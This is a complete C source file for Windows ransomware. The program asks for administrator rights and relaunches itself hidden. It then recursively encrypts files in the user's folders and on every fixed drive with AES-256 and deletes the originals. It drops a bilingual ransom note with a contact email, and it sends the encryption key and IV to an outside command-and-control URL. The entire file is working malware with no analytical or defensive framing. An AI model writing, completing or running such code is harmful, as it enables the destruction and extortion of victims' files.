#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <conio.h>
#include <time.h>
#include <psapi.h>
#include <tchar.h>
#include <bcrypt.h>
#include <threadpoolapiset.h>
#include <wininet.h>

#define BUF_SIZE 65536

typedef struct {
    char* x1;
    unsigned char x2[32];
    unsigned char x3[16];
} XStruct;

void misc(const char* x4, const unsigned char* x2, const unsigned char* x3);
void killme(const char* x5, const unsigned char* x2, const unsigned char* x3, int x6, const char* id);
int y3();
void y4();
void y5(unsigned char* x7, size_t x8);
void y6(unsigned char* x2, unsigned char* x3);
void y7(unsigned char* x2, unsigned char* x3);

TP_CALLBACK_ENVIRON tpoolEnv;
PTP_POOL tpool;
PTP_CLEANUP_GROUP tpoolCleanupGroup;

void CALLBACK tpoolCallback(PTP_CALLBACK_INSTANCE instance, PVOID context, PTP_WORK work) {
    XStruct* x9 = (XStruct*)context;
    if (x9) {
        misc(x9->x1, x9->x2, x9->x3);
        if (x9->x1) {
            SecureZeroMemory(x9->x1, strlen(x9->x1));
            free(x9->x1);
        }
        SecureZeroMemory(x9, sizeof(XStruct));
        free(x9);
    }
}

void initThreadPool() {
    tpool = CreateThreadpool(NULL);
    if (!tpool) {
        printf("tpcf: %d\n", GetLastError());
        exit(1);
    }
    tpoolCleanupGroup = CreateThreadpoolCleanupGroup();
    if (!tpoolCleanupGroup) {
        printf("pf: %d\n", GetLastError());
        CloseThreadpool(tpool);
        exit(1);
    }
    InitializeThreadpoolEnvironment(&tpoolEnv);
    SetThreadpoolCallbackPool(&tpoolEnv, tpool);
    SetThreadpoolCallbackCleanupGroup(&tpoolEnv, tpoolCleanupGroup, NULL);
}

void cleanupThreadPool() {
    if (tpoolCleanupGroup) {
        CloseThreadpoolCleanupGroupMembers(tpoolCleanupGroup, FALSE, NULL);
        CloseThreadpoolCleanupGroup(tpoolCleanupGroup);
    }
    if (tpool) {
        CloseThreadpool(tpool);
    }
}

int checkad() {
    BOOL isAdmin = FALSE;
    PSID pSID = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&SIDAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSID)) {
        CheckTokenMembership(NULL, pSID, &isAdmin);
        FreeSid(pSID);
    }
    return isAdmin;
}

void relaunch() {
    if (!checkad()) {
        TCHAR szPath[MAX_PATH];
        if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath))) {
            SHELLEXECUTEINFO sei = { sizeof(sei) };
            sei.lpVerb = _T("runas");
            sei.lpFile = szPath;
            sei.lpParameters = _T("--foodsum");
            sei.hwnd = NULL;
            sei.nShow = SW_HIDE;
            if (!ShellExecuteEx(&sei)) {
                exit(1);
            }
            exit(0);
        }
    }
}

void misc(const char* x4, const unsigned char* x2, const unsigned char* x3) {
    char modPath[MAX_PATH];
    GetModuleFileName(NULL, modPath, MAX_PATH);
    if (strstr(x4, ".exe") || _stricmp(x4, modPath) == 0) {
        return;
    }
    FILE* inFile = fopen(x4, "rb");
    if (!inFile) return;
    char outFilePath[256];
    snprintf(outFilePath, sizeof(outFilePath), "%s.smert", x4);
    FILE* outFile = fopen(outFilePath, "wb");
    if (!outFile) {
        fclose(inFile);
        return;
    }
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        fclose(inFile);
        fclose(outFile);
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        fclose(inFile);
        fclose(outFile);
        return;
    }
    if (!CryptHashData(hHash, x2, 32, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(inFile);
        fclose(outFile);
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(inFile);
        fclose(outFile);
        return;
    }
    CryptDestroyHash(hHash);
    if (!CryptSetKeyParam(hKey, KP_IV, x3, 0)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        fclose(inFile);
        fclose(outFile);
        return;
    }
    unsigned char buf[BUF_SIZE];
    unsigned char encBuf[BUF_SIZE + 16];
    DWORD bytesRead, bytesWritten;
    BOOL eof = FALSE;
    while ((bytesRead = fread(buf, 1, BUF_SIZE, inFile)) > 0) {
        bytesWritten = bytesRead;
        eof = feof(inFile);
        if (!CryptEncrypt(hKey, 0, eof, 0, encBuf, &bytesWritten, sizeof(encBuf))) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            fclose(inFile);
            fclose(outFile);
            return;
        }
        fwrite(encBuf, 1, bytesWritten, outFile);
    }
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    fclose(inFile);
    fclose(outFile);
    remove(x4);
}

int ransomnoteexists(const char* x5) {
    char rPath[256];
    snprintf(rPath, sizeof(rPath), "%s\\README.txt", x5);
    struct stat buffer;
    return (stat(rPath, &buffer) == 0);
}

void dropransomnote(const char* x5, const char* id) {
    if (ransomnoteexists(x5)) {
        return;
    }
    char rPath[256];
    snprintf(rPath, sizeof(rPath), "%s\\README.txt", x5);
    FILE* readme = fopen(rPath, "w");
    if (readme) {
        fprintf(readme,
            "Your files have been fucked.\n"
            "Your personal ID: %s\n"
            "What can you do about it?\n"
            "Play chess against me. If you win, you will get your files back.\n"
            "Send your personal ID to d3cryptme@firemail.cc\n"
            "You will get a chess invite.\n"
            "Good luck!\n"
            "-------------------------------------\n"
            "Ваши файлы были зашифрованы.\n"
            "Ваш личный идентификатор: %s\n"
            "Что вы можете с этим сделать?\n"
            "Играйте со мной в шахматы. Если вы выиграете, ваши файлы будут возвращены.\n"
            "Отправьте ваш личный идентификатор на d3cryptme@firemail.cc\n"
            "Вы получите приглашение на шахматную партию.\n"
            "Удачи!\n", id, id);
        fclose(readme);
    }
}


int sysdir(const char* x5) {
    const char* sysDirs[] = {
        "C:\\Windows",
        "C:\\Users\\Default",
        "C:\\Users\\Public",
        NULL
    };
    for (int i = 0; sysDirs[i] != NULL; i++) {
        if (_stricmp(x5, sysDirs[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

void killme(const char* x5, const unsigned char* x2, const unsigned char* x3, int x6, const char* id) {
    WIN32_FIND_DATA findData;
    HANDLE hFind;
    char searchPath[512];
    char fullPath[512];
    if (sysdir(x5)) {
        return;
    }
    snprintf(searchPath, sizeof(searchPath), "%s\\*", x5);
    hFind = FindFirstFile(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }
    do {
        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
            snprintf(fullPath, sizeof(fullPath), "%s\\%s", x5, findData.cFileName);
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (x6 < 3) {
                    killme(fullPath, x2, x3, x6 + 1, id);
                }
            } else {
                const char* fileExtension = strrchr(findData.cFileName, '.');
                if (!ransomnoteexists(x5) && (fileExtension == NULL || _stricmp(fileExtension, ".lnk") != 0)) {
                    dropransomnote(x5, id);
                }
                XStruct* x9 = (XStruct*)malloc(sizeof(XStruct));
                if (x9) {
                    x9->x1 = _strdup(fullPath);
                    if (x9->x1) {
                        memcpy(x9->x2, x2, 32);
                        memcpy(x9->x3, x3, 16);
                        PTP_WORK work = CreateThreadpoolWork(tpoolCallback, x9, &tpoolEnv);
                        if (work) {
                            SubmitThreadpoolWork(work);
                        } else {
                            SecureZeroMemory(x9->x1, strlen(x9->x1));
                            free(x9->x1);
                            SecureZeroMemory(x9, sizeof(XStruct));
                            free(x9);
                        }
                    } else {
                        free(x9);
                    }
                }
            }
        }
    } while (FindNextFile(hFind, &findData) != 0);
    FindClose(hFind);
}

void procfiles(const unsigned char* x2, const unsigned char* x3, int x6, const char* id) {
    KNOWNFOLDERID folders[] = { FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Pictures, FOLDERID_Downloads, FOLDERID_Music, FOLDERID_Videos, FOLDERID_Contacts, FOLDERID_Favorites, FOLDERID_Links, FOLDERID_SavedGames, GUID_NULL };
    PWSTR folderPath = NULL;
    for (int i = 0; !IsEqualGUID(&folders[i], &GUID_NULL); i++) {
        if (SHGetKnownFolderPath(&folders[i], 0, NULL, &folderPath) == S_OK) {
            char dirPath[MAX_PATH];
            wcstombs(dirPath, folderPath, MAX_PATH);
            killme(dirPath, x2, x3, x6, id);
            CoTaskMemFree(folderPath);
        }
    }
    for (char drive = 'A'; drive <= 'Z'; drive++) {
        char rootPath[4] = { drive, ':', '\\', '\0' };
        if (GetDriveType(rootPath) == DRIVE_FIXED) {
            killme(rootPath, x2, x3, x6, id);
        }
    }
}

void xorobf(unsigned char* x7, size_t x8) {
    for (size_t i = 0; i < x8; i++) {
        x7[i] ^= 0xAA;
    }
}

void sendkeys(const unsigned char* key, const unsigned char* iv, const char* id) {
    HINTERNET hSession = InternetOpen("TLD13Browser/12.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return;
    HINTERNET hConnect = InternetConnect(hSession, "xmb.pythonanywhere.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hSession);
        return;
    }
    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/c2/receiver", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return;
    }
    char keyHex[65], ivHex[33];
    for (int i = 0; i < 32; ++i) {
        sprintf(&keyHex[i * 2], "%02x", key[i]);
    }
    keyHex[64] = '\0';
    for (int i = 0; i < 16; ++i) {
        sprintf(&ivHex[i * 2], "%02x", iv[i]);
    }
    ivHex[32] = '\0';
    char jsonData[256];
    snprintf(jsonData, sizeof(jsonData), "{\"key\":\"%s\",\"iv\":\"%s\",\"id\":\"%s\"}", keyHex, ivHex, id);
    const char* headers = "Content-Type: application/json";
    int retries = 3;
    while (retries--) {
        if (HttpSendRequest(hRequest, headers, (DWORD)strlen(headers), (LPVOID)jsonData, (DWORD)strlen(jsonData))) {
            break;
        }
        Sleep(1000);
    }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
}

void genkeys(unsigned char* x2, unsigned char* x3, char* id) {
    HCRYPTPROV hProv;
    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, 32, x2);
        CryptGenRandom(hProv, 16, x3);
        CryptReleaseContext(hProv, 0);
        xorobf(x2, 32);
        xorobf(x3, 16);
        sendkeys(x2, x3, id);
    } else {
        exit(1);
    }
}

void deobf(unsigned char* x2, unsigned char* x3) {
    xorobf(x2, 32);
    xorobf(x3, 16);
}

void perid(char* id) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < 19; ++i) {
        if (i % 5 == 4) {
            id[i] = '-';
        } else {
            id[i] = charset[rand() % (sizeof(charset) - 1)];
        }
    }
    id[19] = '\0';
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        relaunch();
        ShellExecute(NULL, "open", argv[0], "--foodsum", NULL, SW_HIDE);
        return 0;
    }
    unsigned char x2[32];
    unsigned char x3[16];
    char personalID[20];
    srand((unsigned int)time(NULL));
    perid(personalID);
    genkeys(x2, x3, personalID);
    deobf(x2, x3);
    initThreadPool();
    if (strcmp(argv[1], "--foodsum") == 0) {
        procfiles(x2, x3, 0, personalID);
    } else {
        return 1;
    }
    cleanupThreadPool();
    return 0;
}
